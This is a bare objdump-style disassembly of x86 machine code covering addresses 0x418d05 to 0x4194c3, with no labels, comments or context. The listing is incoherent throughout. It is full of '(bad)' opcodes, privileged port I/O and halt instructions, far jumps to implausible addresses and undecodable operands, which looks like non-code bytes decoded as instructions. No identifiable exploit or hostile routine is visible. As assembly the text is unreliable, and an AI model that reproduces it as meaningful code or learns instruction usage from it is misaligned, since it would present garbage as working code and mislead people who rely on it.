  418d05:	jae    0x418d08
  418d07:	mov    edx,0x6b26549f
  418d0c:	popa   
  418d0d:	test   eax,0x11b02061
  418d12:	stc    
  418d13:	push   0x53
  418d15:	add    al,BYTE PTR [ecx+0x2e030824]
  418d1b:	aam    0xa1
  418d1d:	jmp    FWORD PTR ds:0x414bf0af
  418d23:	add    ch,bl
  418d25:	push   0x60
  418d27:	cmp    eax,edi
  418d29:	lock mov edx,0x5aa2acc5
  418d2f:	lea    ebx,[eax-0x40]
  418d32:	lods   al,BYTE PTR ds:[esi]
  418d33:	les    ebx,FWORD PTR [esi]
  418d35:	add    BYTE PTR ds:0x49e207e5,cl
  418d3b:	inc    ebp
  418d3c:	push   ds
  418d3d:	inc    edx
  418d3e:	mov    DWORD PTR [eax],esp
  418d40:	sub    BYTE PTR [ecx-0x2c379857],dh
  418d46:	repz push 0x563e5133
  418d4c:	add    ah,bh
  418d4e:	enter  0xa711,0x39
  418d52:	daa    
  418d53:	jmp    0x82706de2
  418d58:	and    DWORD PTR [edi+ebx*4+0x6695031a],edx
  418d5f:	push   ebx
  418d60:	inc    edx
  418d61:	ror    DWORD PTR [edx],0xfa
  418d64:	push   0x4f237ebf
  418d69:	push   ebx
  418d6a:	outs   dx,BYTE PTR ds:[si]
  418d6c:	sbb    esp,esi
  418d6e:	xchg   esi,eax
  418d6f:	push   cs
  418d70:	sar    BYTE PTR [eax+edx*1],0xf5
  418d74:	sahf   
  418d75:	(bad)  
  418d76:	adc    al,0xe9
  418d78:	inc    eax
  418d79:	rcr    BYTE PTR [ebx+0x6d],0x89
  418d7d:	retf   
  418d7e:	ficomp WORD PTR [eax]
  418d80:	jmp    0x366867eb
  418d85:	ret    
  418d86:	lods   al,BYTE PTR ds:[esi]
  418d87:	adc    bl,BYTE PTR [ecx]
  418d89:	icebp  
  418d8a:	push   0xffffff93
  418d8c:	sbb    al,0xe4
  418d8e:	ds nop
  418d90:	sbb    al,0x28
  418d92:	pop    ds
  418d93:	fild   WORD PTR [edx]
  418d95:	mov    ebx,0xbde144e1
  418d9a:	pop    esp
  418d9b:	out    dx,al
  418d9c:	xchg   ebp,ecx
  418d9e:	pop    eax
  418d9f:	cmp    BYTE PTR ds:0x1bb921e0,bl
  418da5:	jb     0x418db9
  418da7:	inc    ebp
  418da8:	jbe    0x418d96
  418daa:	mov    WORD PTR [esi],ss
  418dac:	cmc    
  418dad:	inc    edx
  418dae:	add    ah,BYTE PTR [edx-0x21]
  418db1:	les    eax,FWORD PTR [eax+0x4dd60d1c]
  418db7:	in     al,0x30
  418db9:	mov    DWORD PTR [ebx+0x72],ebp
  418dbc:	xor    edi,DWORD PTR [ecx+0x2d74698f]
  418dc2:	out    dx,al
  418dc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418dc5:	pop    ebp
  418dc6:	hlt    
  418dc7:	cmp    dh,BYTE PTR [ecx+ecx*2+0x22e1b8a1]
  418dce:	outs   dx,BYTE PTR ds:[esi]
  418dcf:	aas    
  418dd0:	mov    bh,0x84
  418dd2:	stos   DWORD PTR es:[edi],eax
  418dd3:	and    edi,DWORD PTR ds:0x4efc9e5c
  418dd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418dda:	or     esp,DWORD PTR [edi-0x27]
  418ddd:	hlt    
  418dde:	sbb    eax,0xfacd7a22
  418de3:	imul   ecx,DWORD PTR [ebp+0x37136851],0x8570a26
  418ded:	ds into 
  418def:	in     al,0x10
  418df1:	cmp    WORD PTR [ebx+0x4de27717],cx
  418df8:	and    BYTE PTR [esi-0x13c9157b],al
  418dfe:	push   es
  418dff:	clc    
  418e00:	fst    DWORD PTR [eax]
  418e02:	sub    DWORD PTR [edi],ebp
  418e04:	push   esi
  418e05:	fdiv   st,st(2)
  418e07:	div    BYTE PTR ds:0x917c9619
  418e0d:	xchg   BYTE PTR ds:0x3a187411,al
  418e13:	and    BYTE PTR [edx-0x433d6892],cl
  418e19:	inc    edx
  418e1a:	pop    esp
  418e1b:	pusha  
  418e1c:	in     eax,0x7f
  418e1e:	or     al,0x8c
  418e20:	mov    edi,0x7f9aab4f
  418e25:	or     DWORD PTR [ebx],ebp
  418e27:	or     eax,0x9d2b7769
  418e2c:	push   ss
  418e2d:	inc    edx
  418e2e:	xchg   edi,eax
  418e2f:	xchg   esp,eax
  418e30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e31:	popa   
  418e32:	aas    
  418e33:	outs   dx,DWORD PTR ds:[esi]
  418e34:	imul   ebx,ecx,0xffffffdd
  418e37:	shr    BYTE PTR [edx+eax*1],1
  418e3a:	retf   
  418e3b:	leave  
  418e3c:	add    BYTE PTR [ecx],ah
  418e3e:	pop    edi
  418e3f:	pop    ebp
  418e40:	js     0x418e1f
  418e42:	rcl    ah,0x9c
  418e45:	mul    BYTE PTR [eax]
  418e47:	jnp    0x418ec2
  418e49:	mov    dl,ah
  418e4b:	inc    ecx
  418e4c:	mov    ch,0xeb
  418e4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e4f:	cld    
  418e50:	hlt    
  418e51:	xchg   ebx,eax
  418e52:	pop    ebx
  418e53:	pop    edx
  418e54:	les    ebx,FWORD PTR [edi]
  418e56:	and    eax,0x12edfa67
  418e5b:	or     esi,DWORD PTR [edx]
  418e5d:	mov    edx,0x49def27f
  418e62:	push   0x18f71529
  418e67:	sub    dh,al
  418e69:	adc    BYTE PTR [esi-0x2da93f35],bh
  418e6f:	add    DWORD PTR [ebp-0x7],0x3c
  418e73:	(bad)  [eax]
  418e75:	adc    DWORD PTR [ebp-0x73590213],ecx
  418e7b:	push   ss
  418e7c:	pop    ebp
  418e7d:	in     eax,dx
  418e7e:	cmp    DWORD PTR [ebx+0x2b],0x54
  418e82:	test   eax,esi
  418e84:	mov    BYTE PTR [eax+edi*2-0x3dbc107],bl
  418e8b:	das    
  418e8c:	xor    DWORD PTR [esi],esp
  418e8e:	dec    esi
  418e8f:	stos   BYTE PTR es:[edi],al
  418e90:	pop    esi
  418e91:	sbb    al,0xaa
  418e93:	pop    ds
  418e94:	dec    edx
  418e95:	push   ebp
  418e96:	cwde   
  418e97:	shr    DWORD PTR [ebx-0x31],1
  418e9a:	call   0x3b8e:0x7307bf82
  418ea1:	in     al,0x3
  418ea3:	and    ebp,DWORD PTR [ebx]
  418ea5:	lahf   
  418ea6:	fnstenv [edx-0x6e]
  418ea9:	inc    ecx
  418eaa:	add    eax,esp
  418eac:	pop    ecx
  418ead:	sar    ch,cl
  418eaf:	lods   al,BYTE PTR ds:[esi]
  418eb0:	stc    
  418eb1:	dec    eax
  418eb2:	shr    BYTE PTR [ecx],1
  418eb4:	jns    0x418ea8
  418eb6:	mov    ebp,0x4f56c7cd
  418ebb:	pushf  
  418ebc:	retf   0xfa60
  418ebf:	mov    edx,0x4271749e
  418ec4:	and    ah,BYTE PTR [ebx+0x56a8cbba]
  418eca:	clc    
  418ecb:	dec    ecx
  418ecc:	add    eax,ebx
  418ece:	pop    ds
  418ecf:	in     al,0x48
  418ed1:	imul   DWORD PTR [ebx]
  418ed3:	js     0x418ef6
  418ed5:	repnz daa 
  418ed7:	inc    ecx
  418ed8:	mov    ebp,0x8de8f715
  418edd:	lods   eax,DWORD PTR ds:[esi]
  418ede:	(bad)  [eax+0x57]
  418ee1:	jno    0x418f60
  418ee3:	daa    
  418ee4:	jo     0x418e76
  418ee6:	push   edx
  418ee7:	inc    edx
  418ee8:	stc    
  418ee9:	xchg   ebp,eax
  418eea:	iret   
  418eeb:	lea    eax,[ecx+0x6]
  418eee:	mov    ebp,0xad8f2416
  418ef3:	xor    al,BYTE PTR [edi+0x62c11165]
  418ef9:	(bad)  
  418efa:	jg     0x418f47
  418efc:	pop    es
  418efd:	inc    edx
  418efe:	fadd   DWORD PTR [eax]
  418f00:	in     eax,0x42
  418f02:	out    dx,eax
  418f03:	sbb    eax,0xa59f7603
  418f08:	or     al,0xd9
  418f0a:	retf   0x7558
  418f0d:	and    ecx,DWORD PTR [esi+0x17fdcf3e]
  418f13:	push   edi
  418f14:	out    dx,al
  418f15:	sar    DWORD PTR ds:0xb5baa3e0,0x5b
  418f1c:	test   al,0xcd
  418f1e:	sbb    BYTE PTR [ebx+0x4c3b38a6],al
  418f24:	pop    edi
  418f25:	sbb    al,0x7b
  418f27:	jecxz  0x418f9c
  418f29:	(bad)  
  418f2a:	lock arpl WORD PTR [edx],cx
  418f2d:	mov    BYTE PTR [edi],ah
  418f2f:	lahf   
  418f30:	xor    al,BYTE PTR [esi]
  418f32:	in     eax,dx
  418f33:	sbb    al,BYTE PTR [edx+0x55]
  418f36:	icebp  
  418f37:	leave  
  418f38:	inc    eax
  418f39:	addr16 aas 
  418f3b:	(bad)  
  418f3c:	in     al,0x15
  418f3e:	test   eax,0xed4e64b4
  418f43:	add    eax,0x8d9cf19e
  418f48:	jae    0x418f02
  418f4a:	fbstp  TBYTE PTR [eax-0x32]
  418f4d:	sbb    eax,0xddea4f34
  418f52:	cli    
  418f53:	jmp    0xd4b0:0x1fe115c6
  418f5a:	cmp    bh,BYTE PTR [ebp+edi*1+0x70]
  418f5e:	jl     0x418ef0
  418f60:	les    esi,FWORD PTR [edx]
  418f62:	push   ss
  418f63:	dec    edi
  418f64:	inc    ecx
  418f65:	scas   al,BYTE PTR es:[edi]
  418f66:	cwde   
  418f67:	sub    al,0xed
  418f69:	pop    eax
  418f6a:	adc    DWORD PTR ds:0x116533a0,ebx
  418f70:	jg     0x418f78
  418f72:	mov    al,ds:0xb26b4631
  418f77:	fild   QWORD PTR [eax-0x111b790f]
  418f7d:	shl    ecx,cl
  418f7f:	mov    edi,0xbb561033
  418f84:	lods   eax,DWORD PTR ds:[esi]
  418f85:	xor    ebp,edx
  418f87:	dec    DWORD PTR [edx]
  418f89:	enter  0x8725,0x5b
  418f8d:	xor    al,0x59
  418f8f:	add    dl,BYTE PTR ds:0x8cb4f58f
  418f95:	icebp  
  418f96:	dec    edx
  418f97:	mov    ah,0x88
  418f99:	(bad)  
  418f9a:	out    dx,eax
  418f9b:	mov    ecx,0xcf749b39
  418fa0:	mov    cl,0x56
  418fa2:	mov    bh,0x88
  418fa4:	shr    DWORD PTR [edi+edi*2+0x31],0x96
  418fa9:	jg     0x418f99
  418fab:	xchg   edi,eax
  418fac:	mov    eax,0xed30824d
  418fb1:	test   al,0xd7
  418fb3:	push   esi
  418fb4:	mov    bh,0xba
  418fb6:	ins    DWORD PTR es:[edi],dx
  418fb7:	fadd   st(7),st
  418fb9:	popf   
  418fba:	add    BYTE PTR [edx-0x478ebbe8],bh
  418fc0:	push   esi
  418fc1:	mov    al,bl
  418fc3:	jg     0x419041
  418fc5:	icebp  
  418fc6:	cli    
  418fc7:	push   edx
  418fc8:	repz pushf 
  418fca:	mov    dl,0x94
  418fcc:	out    dx,al
  418fcd:	xchg   ecx,eax
  418fce:	jg     0x418fee
  418fd0:	xchg   edx,eax
  418fd1:	cs lahf 
  418fd3:	scas   al,BYTE PTR es:[edi]
  418fd4:	jno    0x419021
  418fd6:	les    esi,FWORD PTR [esi-0x945557e]
  418fdc:	mov    cl,BYTE PTR [edx+ebx*8+0x50]
  418fe0:	jecxz  0x418fe1
  418fe2:	into   
  418fe3:	lods   al,BYTE PTR ds:[esi]
  418fe4:	sbb    bh,cl
  418fe6:	push   eax
  418fe7:	arpl   WORD PTR [eax+0x2590b98f],sp
  418fed:	mov    WORD PTR [ebp+0xf],ds
  418ff0:	inc    ebx
  418ff1:	mov    gs,WORD PTR [eax]
  418ff3:	cli    
  418ff4:	ins    BYTE PTR es:[edi],dx
  418ff5:	ds icebp 
  418ff7:	(bad)  [esi+0x4f]
  418ffa:	sbb    al,0xb2
  418ffc:	or     esp,ecx
  418ffe:	adc    dh,BYTE PTR [esi]
  419000:	test   esi,0x973a4bde
  419006:	out    0x28,eax
  419008:	rcr    BYTE PTR [eax+eiz*1-0x535da968],1
  41900f:	dec    ebx
  419010:	loopne 0x41905e
  419012:	repnz xchg esp,eax
  419014:	cmp    BYTE PTR [edi],bl
  419016:	loop   0x41907a
  419018:	mov    ch,0xcb
  41901a:	xchg   DWORD PTR [edi+0x6e4bc624],esi
  419020:	push   eax
  419021:	sbb    al,0xee
  419023:	test   DWORD PTR [ebx+esi*4-0x3f2a280d],0x7ed2ea27
  41902e:	(bad)
  419031:	and    edi,ecx
  419033:	cmp    eax,0xbfeaeaca
  419038:	ja     0x4190a4
  41903a:	dec    ebx
  41903b:	sub    eax,0xfefde92f
  419040:	sub    al,al
  419042:	inc    ecx
  419043:	in     eax,dx
  419044:	rol    DWORD PTR [eax+0x5c76e4b9],0x1e
  41904b:	or     dh,BYTE PTR [ecx-0xa]
  41904e:	push   cs
  41904f:	sub    esp,0xe
  419052:	fld    DWORD PTR [edx+eax*2]
  419055:	mov    esi,0x987ce1e0
  41905a:	sub    DWORD PTR [edx],esi
  41905c:	xlat   BYTE PTR ds:[ebx]
  41905d:	mov    ds:0x19bcea4b,eax
  419062:	mov    bh,0xb3
  419064:	pushf  
  419065:	sub    eax,0x2266cbe3
  41906a:	mov    ecx,0x7fd786f9
  41906f:	or     al,0x79
  419071:	cmp    esp,DWORD PTR [ebx+edi*8+0x5222a5c]
  419078:	fiadd  WORD PTR [esi+0x7ca6d070]
  41907e:	pop    eax
  41907f:	mov    bh,0x76
  419081:	stos   DWORD PTR es:[edi],eax
  419082:	pushf  
  419083:	xchg   edx,eax
  419084:	or     DWORD PTR [ecx],edx
  419086:	fsubr  st,st(6)
  419088:	push   esp
  419089:	push   DWORD PTR [ecx]
  41908b:	mov    ?,WORD PTR [edi-0x4f72605f]
  419091:	push   es
  419092:	mov    sp,0x25c5
  419096:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419097:	inc    edi
  419098:	and    BYTE PTR [eax+0x47944988],bh
  41909e:	mov    ds:0x3cfb8ed2,eax
  4190a3:	add    eax,0xaf242924
  4190a8:	ins    BYTE PTR es:[edi],dx
  4190a9:	(bad)  
  4190aa:	adc    esi,edx
  4190ac:	xor    BYTE PTR [edx],dh
  4190ae:	repz and al,0x6f
  4190b1:	das    
  4190b2:	mov    cl,0x63
  4190b4:	outs   dx,BYTE PTR ds:[esi]
  4190b5:	cmp    eax,ecx
  4190b7:	adc    cl,BYTE PTR [esp+eiz*2-0x3c]
  4190bb:	xchg   esi,eax
  4190bc:	push   di
  4190be:	dec    eax
  4190bf:	jmp    0xc65d:0x29b7f862
  4190c6:	fmul   DWORD PTR [esi]
  4190c8:	push   esp
  4190c9:	mov    bh,0x8a
  4190cb:	mov    ds:0x73d4e73f,eax
  4190d0:	stos   DWORD PTR es:[edi],eax
  4190d1:	xchg   BYTE PTR [ecx-0x6d],al
  4190d4:	add    BYTE PTR [ebp-0x43ce0],dh
  4190da:	jp     0x41908f
  4190dc:	cmp    esp,DWORD PTR [edi]
  4190de:	xchg   ebx,eax
  4190df:	loope  0x4190cc
  4190e1:	xchg   edi,eax
  4190e2:	push   eax
  4190e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190e4:	adc    al,dh
  4190e6:	iret   
  4190e7:	mov    bl,BYTE PTR [eax+0x27b99473]
  4190ed:	ficomp WORD PTR [eax]
  4190ef:	cs push 0xeb0c965d
  4190f5:	mov    ecx,0xbdd67a62
  4190fa:	inc    esi
  4190fb:	or     eax,0x1a058288
  419100:	retf   
  419101:	push   cs
  419102:	mov    eax,0xf20e1e8b
  419107:	sahf   
  419108:	jg     0x41909b
  41910a:	xchg   esp,eax
  41910b:	mov    ebx,0xb64fb16d
  419110:	pop    ds
  419111:	add    ebx,DWORD PTR [edx+ebx*8]
  419114:	rcl    BYTE PTR [ebx-0x20],1
  419117:	sub    dl,ah
  419119:	push   cs
  41911a:	adc    edi,edx
  41911c:	mov    eax,0xbbf16305
  419121:	jnp    0x419145
  419123:	(bad)  
  419124:	jmp    0x4190db
  419126:	sub    edx,0xa
  419129:	mov    bl,0x4e
  41912b:	inc    edi
  41912c:	add    eax,0x4d28998
  419131:	mov    dh,0x36
  419133:	fs ret 0x23db
  419137:	retf   
  419138:	add    al,0xac
  41913a:	push   0xd11ed1f1
  41913f:	sub    al,ch
  419141:	xor    cl,al
  419143:	bound  ebx,QWORD PTR [eiz*8-0x26fae026]
  41914a:	add    DWORD PTR [ebp+0x7b],edx
  41914d:	stc    
  41914e:	ds in  al,dx
  419150:	das    
  419151:	scas   al,BYTE PTR es:[edi]
  419152:	lods   eax,DWORD PTR ds:[esi]
  419153:	outs   dx,DWORD PTR ds:[esi]
  419154:	scas   al,BYTE PTR es:[edi]
  419155:	xor    eax,ecx
  419157:	and    al,0x67
  419159:	ins    DWORD PTR es:[edi],dx
  41915a:	or     BYTE PTR [eax+0x3605011b],bl
  419160:	or     al,0x4f
  419162:	jge    0x4191b7
  419164:	adc    eax,0x802d5322
  419169:	jo     0x4191a3
  41916b:	stc    
  41916c:	sub    esp,DWORD PTR [edi*4+0xbb61fc5]
  419173:	mov    bl,0xd4
  419175:	sbb    eax,0x1b441b52
  41917a:	outs   dx,BYTE PTR ds:[esi]
  41917b:	test   BYTE PTR [eax+0x15],dh
  41917e:	mov    al,ds:0x911f0f98
  419183:	aam    0x94
  419185:	push   edi
  419186:	pop    ss
  419187:	(bad)  
  419188:	aas    
  419189:	inc    edx
  41918a:	dec    esi
  41918b:	(bad)  
  41918c:	mov    eax,ds:0xac9991ea
  419191:	push   edi
  419192:	add    dl,bl
  419194:	out    0x57,al
  419196:	dec    edx
  419197:	ins    BYTE PTR es:[edi],dx
  419198:	pop    ebp
  419199:	sahf   
  41919a:	mov    ch,0xfd
  41919c:	dec    edi
  41919d:	arpl   WORD PTR [ebp-0x72],sp
  4191a0:	or     eax,0xba616403
  4191a5:	jb     0x41912c
  4191a7:	cmp    cl,BYTE PTR [edi+0x24]
  4191aa:	(bad)  
  4191ab:	dec    esp
  4191ac:	or     eax,0x915738d4
  4191b1:	mov    ch,0x4e
  4191b3:	jl     0x41920d
  4191b5:	(bad)  
  4191b6:	(bad)  
  4191b7:	in     eax,dx
  4191b8:	or     DWORD PTR [esi-0x6e],0xe15c85dd
  4191bf:	add    ch,BYTE PTR [edi+eax*2+0x62]
  4191c3:	fs ins DWORD PTR es:[edi],dx
  4191c5:	dec    esi
  4191c6:	jo     0x419205
  4191c8:	fcomp  DWORD PTR [ebp-0x4c]
  4191cb:	mov    edx,0xaffe226a
  4191d0:	xchg   esi,eax
  4191d1:	cld    
  4191d2:	jo     0x4191dd
  4191d4:	stos   BYTE PTR es:[edi],al
  4191d5:	shr    BYTE PTR [eax-0x71],1
  4191d8:	cmp    esi,esp
  4191da:	loop   0x41916a
  4191dc:	inc    edx
  4191dd:	jnp    0x41921e
  4191df:	icebp  
  4191e0:	push   eax
  4191e1:	jmp    FWORD PTR [esi-0x4e]
  4191e4:	cmp    bh,ah
  4191e6:	mov    bl,0x46
  4191e8:	jecxz  0x41925d
  4191ea:	fcom   DWORD PTR [ecx-0x4a]
  4191ed:	mov    ecx,0x264ecfe7
  4191f2:	push   es
  4191f3:	loop   0x4191c2
  4191f5:	inc    BYTE PTR [edi-0x5eafd0b5]
  4191fb:	mov    al,0x59
  4191fd:	test   eax,0xed149e8e
  419202:	push   0xffffffd5
  419204:	rcr    DWORD PTR [ecx-0x43],1
  419207:	mov    esi,0xe8717e1e
  41920c:	push   edi
  41920d:	push   es
  41920e:	outs   dx,BYTE PTR ds:[esi]
  41920f:	(bad)  [edi+0x79de8c44]
  419215:	inc    edx
  419216:	cmp    BYTE PTR [eax+0x3f],cl
  419219:	stos   BYTE PTR es:[edi],al
  41921a:	sub    ecx,eax
  41921c:	xor    cl,bh
  41921e:	xor    ecx,DWORD PTR [ebx-0x2a1ccfd9]
  419224:	dec    esp
  419225:	jmp    0x419246
  419227:	scas   al,BYTE PTR es:[edi]
  419228:	mov    cl,0xf4
  41922a:	push   esp
  41922b:	add    ch,BYTE PTR [ecx+eiz*1-0x3b71d9dc]
  419232:	aam    0x71
  419234:	ret    0x3a15
  419237:	or     ebx,edx
  419239:	sub    edx,ebx
  41923b:	(bad)  
  41923c:	loop   0x4191f9
  41923e:	imul   edi,DWORD PTR [eax],0x3a40ba2b
  419244:	in     eax,0x71
  419246:	test   eax,0xa8d3e553
  41924b:	ror    BYTE PTR [ecx],cl
  41924d:	cmp    edx,ecx
  41924f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419250:	pop    ebx
  419251:	out    dx,eax
  419252:	jg     0x419225
  419254:	sub    ebp,DWORD PTR [ebx+0x1a067fb3]
  41925a:	daa    
  41925b:	cmp    DWORD PTR [eax+0x58],esp
  41925e:	dec    ecx
  41925f:	scas   eax,DWORD PTR es:[edi]
  419260:	mov    BYTE PTR [edx],ah
  419262:	rcr    DWORD PTR [ecx],1
  419264:	loop   0x41920f
  419266:	mov    al,BYTE PTR [eax-0x649f0d4d]
  41926c:	clc    
  41926d:	jle    0x419293
  41926f:	push   es
  419270:	add    DWORD PTR [edi-0x67bfb75a],esi
  419276:	adc    ch,BYTE PTR [esi]
  419278:	inc    edi
  419279:	sub    DWORD PTR [eax+0x22c95673],esi
  41927f:	and    ecx,DWORD PTR [ebx+0x20]
  419282:	(bad)  
  419284:	cld    
  419285:	dec    edx
  419286:	mov    eax,0xd4961ad7
  41928b:	mov    edi,0x7bbf7b27
  419290:	pushf  
  419291:	retf   0xba93
  419294:	dec    ebp
  419295:	loope  0x4192de
  419297:	inc    ebx
  419298:	inc    edi
  419299:	pop    ebp
  41929a:	push   0x4d733f67
  41929f:	and    eax,0x76526b0c
  4192a4:	dec    eax
  4192a5:	adc    eax,0xdd56d426
  4192aa:	push   es
  4192ab:	repnz xor al,0xc4
  4192ae:	dec    esi
  4192af:	inc    edx
  4192b0:	inc    ebp
  4192b1:	cmp    eax,0x52b08632
  4192b6:	dec    eax
  4192b7:	sub    eax,0xc9077fb2
  4192bc:	in     al,0x9f
  4192be:	lods   al,BYTE PTR ds:[esi]
  4192bf:	loope  0x4192ae
  4192c1:	mov    dl,0xf7
  4192c3:	sbb    eax,ebp
  4192c5:	add    BYTE PTR [esi],dl
  4192c7:	dec    edi
  4192c8:	scas   al,BYTE PTR es:[edi]
  4192c9:	dec    edi
  4192ca:	xor    BYTE PTR [ebx+0x32532b84],cl
  4192d0:	pusha  
  4192d1:	jecxz  0x419263
  4192d3:	mov    al,0x6e
  4192d5:	mov    cs,ecx
  4192d7:	aas    
  4192d8:	pusha  
  4192d9:	jp     0x41926b
  4192db:	je     0x41931f
  4192dd:	mov    edi,0x3e113572
  4192e2:	mov    ebx,0xd7172f76
  4192e7:	jno    0x4192e3
  4192e9:	aad    0xe9
  4192eb:	cld    
  4192ec:	cmp    DWORD PTR [edx],edi
  4192ee:	imul   edx,DWORD PTR [ebp+0x315c1564],0xfffffff9
  4192f5:	popf   
  4192f6:	xchg   edx,eax
  4192f7:	fidivr WORD PTR [edi-0x62b58fb3]
  4192fd:	sbb    DWORD PTR [ecx-0x67],edi
  419300:	jo     0x419365
  419302:	mov    ds:0x4fb4e85b,al
  419307:	inc    esi
  419308:	mov    eax,ds:0x797d5fa8
  41930d:	shr    DWORD PTR [ecx-0x6d],0x55
  419311:	cs int3 
  419313:	jmp    0x41934c
  419315:	push   ebx
  419316:	jl     0x4192fb
  419318:	xchg   esp,eax
  419319:	push   eax
  41931a:	mov    ebp,0x84890c0a
  41931f:	sti    
  419320:	mov    BYTE PTR [ebx+edi*2-0x2d1f24f8],ah
  419327:	ss cmp dl,dh
  41932a:	jg     0x4192ea
  41932c:	mov    BYTE PTR [ebp+0x3a],dh
  41932f:	les    ebp,FWORD PTR [edi]
  419331:	xor    edx,esp
  419333:	fist   WORD PTR [ebp+0x68]
  419336:	or     edx,ecx
  419338:	dec    edx
  419339:	out    0x99,eax
  41933b:	stos   BYTE PTR es:[edi],al
  41933c:	mov    ?,esp
  41933e:	repnz in al,dx
  419340:	sub    eax,0x65ef0617
  419345:	sub    cl,dh
  419347:	mov    ebp,0xb218f2d5
  41934c:	mov    esp,0x674f8e7e
  419351:	lahf   
  419352:	dec    ebp
  419353:	ret    
  419354:	jmp    0x419315
  419356:	push   esp
  419357:	mov    dl,0x2a
  419359:	push   esp
  41935a:	les    ecx,FWORD PTR [ecx-0x26]
  41935d:	lahf   
  41935e:	mov    BYTE PTR [edx],bh
  419360:	and    bl,BYTE PTR [esi+0x4f]
  419363:	lock mov ds:0xaa3319cb,al
  419369:	fstp   TBYTE PTR [ebx+ebx*8+0x75]
  41936d:	lock scas al,BYTE PTR es:[edi]
  41936f:	repnz mov WORD PTR [ecx],?
  419372:	(bad)  
  419373:	gs cld 
  419375:	mov    al,ds:0x78f72501
  41937a:	or     ebp,ebx
  41937c:	addr16 xchg ebx,eax
  41937e:	mov    al,ds:0x357e5f0d
  419383:	not    esi
  419385:	cld    
  419386:	inc    edx
  419387:	popa   
  419388:	adc    DWORD PTR [ecx+edi*4],ecx
  41938b:	imul   dh
  41938d:	lock in eax,dx
  41938f:	lock (bad) [edi-0x3e4f6599]
  419396:	(bad)  
  419397:	or     ecx,DWORD PTR [edi+edx*4+0x77]
  41939b:	cmc    
  41939c:	xchg   BYTE PTR [ecx+0x5ac70120],dl
  4193a2:	xchg   edi,eax
  4193a3:	dec    esi
  4193a4:	xchg   esi,eax
  4193a5:	pusha  
  4193a6:	ret    0x4c5
  4193a9:	in     al,dx
  4193aa:	push   esi
  4193ab:	adc    eax,0xc199208e
  4193b0:	sub    bh,BYTE PTR [edx+0x2b5a047a]
  4193b6:	ins    BYTE PTR es:[edi],dx
  4193b7:	loope  0x419394
  4193b9:	push   ds
  4193ba:	shl    DWORD PTR [ebp-0x56],cl
  4193bd:	loop   0x4193e5
  4193bf:	xchg   edx,eax
  4193c0:	hlt    
  4193c1:	outs   dx,BYTE PTR ds:[esi]
  4193c2:	adc    al,0x9f
  4193c4:	mov    ebp,edx
  4193c6:	push   ebx
  4193c7:	mov    esi,0xca29c3f4
  4193cc:	mov    dh,0x4f
  4193ce:	stos   DWORD PTR es:[edi],eax
  4193cf:	mov    eax,ebx
  4193d1:	sub    DWORD PTR [eax-0x5b389fd4],ecx
  4193d7:	xchg   ebx,eax
  4193d8:	sub    al,0x5e
  4193da:	pop    ecx
  4193db:	xor    al,0xe7
  4193dd:	stos   DWORD PTR es:[edi],eax
  4193de:	ffreep st(6)
  4193e0:	arpl   WORD PTR [ebp-0x1a983e35],di
  4193e6:	aam    0x29
  4193e8:	push   ecx
  4193e9:	jmp    0x419442
  4193eb:	add    ch,BYTE PTR [ebx]
  4193ed:	std    
  4193ee:	jns    0x419437
  4193f0:	in     al,0xa6
  4193f2:	sbb    ch,ah
  4193f4:	jns    0x4193e3
  4193f6:	pop    ss
  4193f7:	dec    edi
  4193f8:	and    eax,0x80efcb65
  4193fd:	das    
  4193fe:	(bad)  
  419400:	pop    edi
  419401:	or     ecx,DWORD PTR [edi-0x3bf17365]
  419407:	or     BYTE PTR [edi+0x3597618d],ah
  41940d:	cli    
  41940e:	push   ebx
  41940f:	mov    eax,ds:0x2918986b
  419414:	arpl   dx,sp
  419416:	icebp  
  419417:	push   0xe2804c89
  41941c:	out    0x92,eax
  41941e:	sub    al,0xfa
  419420:	inc    edx
  419421:	xor    bh,dh
  419423:	loopne 0x41947a
  419425:	mov    esi,0x68f7a3ed
  41942a:	shr    BYTE PTR [edx+0x21d89fb5],cl
  419430:	fadd   DWORD PTR [esi]
  419432:	push   ss
  419433:	popa   
  419434:	cmp    al,0x49
  419436:	pop    edi
  419437:	mov    ebp,0xc08dbc43
  41943c:	push   es
  41943d:	dec    eax
  41943e:	fist   DWORD PTR [edi+0x22]
  419441:	scas   eax,DWORD PTR es:[edi]
  419442:	into   
  419443:	mov    ebp,0x4455d5d
  419448:	cdq    
  419449:	xor    DWORD PTR [esi+eax*8],ecx
  41944c:	cli    
  41944d:	dec    eax
  41944e:	jecxz  0x419447
  419450:	test   DWORD PTR [eax-0x37],esi
  419453:	idiv   bh
  419455:	loopne 0x4193e0
  419457:	sbb    DWORD PTR [eax+0xf],ebx
  41945a:	push   ds
  41945b:	pop    ecx
  41945c:	sbb    esp,DWORD PTR [ecx]
  41945e:	dec    ecx
  41945f:	pop    ebp
  419460:	ds mov ecx,0xf2f9d890
  419466:	bound  esi,QWORD PTR [edi]
  419468:	inc    ecx
  419469:	mov    esp,0xf5408589
  41946e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41946f:	out    0x62,al
  419471:	dec    eax
  419472:	fcom   DWORD PTR [edi+0x7e]
  419475:	test   al,0xe0
  419477:	ret    
  419478:	adc    bh,0x13
  41947b:	das    
  41947c:	aas    
  41947d:	xor    BYTE PTR [eax],cl
  41947f:	pop    ecx
  419480:	adc    esi,DWORD PTR [ebx+0x4]
  419483:	dec    eax
  419484:	push   esi
  419485:	jmp    0x419471
  419487:	arpl   WORD PTR [edx-0x6405a43],ax
  41948d:	mov    esp,0xf39276dc
  419492:	les    ecx,FWORD PTR ds:0xede60557
  419498:	std    
  419499:	or     al,al
  41949b:	push   ds
  41949c:	jnp    0x41948c
  41949e:	pop    ds
  41949f:	sub    ebx,ebx
  4194a1:	pop    ebx
  4194a2:	loope  0x419468
  4194a4:	into   
  4194a5:	or     eax,0xfa50980a
  4194aa:	jle    0x419529
  4194ac:	add    eax,0x2990f123
  4194b1:	adc    BYTE PTR [eax-0x2594c934],bl
  4194b7:	inc    edx
  4194b8:	xor    al,0xc0
  4194ba:	xor    bh,BYTE PTR [edx+0x5f]
  4194bd:	ins    DWORD PTR es:[edi],dx
  4194be:	cmp    eax,0x9775ef3a
  4194c3:	xchg   edi,eax
